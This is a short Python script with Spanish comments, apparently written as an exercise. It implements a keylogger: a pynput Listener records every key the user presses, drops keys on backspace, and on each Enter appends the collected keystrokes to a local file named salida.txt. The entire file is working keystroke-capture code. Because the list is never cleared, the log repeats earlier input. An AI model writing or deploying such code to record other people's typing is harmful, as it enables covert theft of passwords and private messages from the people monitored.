from pynput.keyboard import Key, Listener

# Lista que almacena todas las pulsaciones del usuario
teclas_presionadas = []

# Creara un archivo de texto para almacenar lo que el usuario esta escribiendo
def escribir_text(lista_teclas):
    with open("salida.txt", "a") as file:
        # Este ciclo ira recorriendo letra por letra las palabras que el usuario ponga dentro
        # La lista "teclas presionadas"
        for letra in lista_teclas:
            file.write(str(letra))
# Crear dos funciones para cada movimiento del teclado

# Cuando el usuario presiona una tecla
def presionado(tecla):
    # print(f"Se presiono la tecla {tecla}")

    match tecla:
        case Key.ctrl_l:
            pass
        case Key.alt_gr:
            pass
        case Key.backspace:
            if len(teclas_presionadas) == 0:
                pass
            else:
                teclas_presionadas.pop()
        case Key.enter:
            print(tecla)
        case _:
            teclas_presionadas.append(tecla)

    if tecla == Key.enter:
        print(teclas_presionadas)

# Cuando el usuario libera una tecla
def liberado(tecla):
    if tecla == Key.enter:
        escribir_text(teclas_presionadas)
    #print(f"Se libero la tecla {tecla}")


# Crear un metodo que se encargue de escuchar lo que el teclado recibe
with Listener(on_press = presionado, on_release = liberado) as listener:

    # 1. Se ejecuta de manera continua el metodo Listener
    # 2. Si el usuario presiona una tecla, resultado lo guarda como "listenner"
    # 3. Lo agrega a los resultados

    listener.join()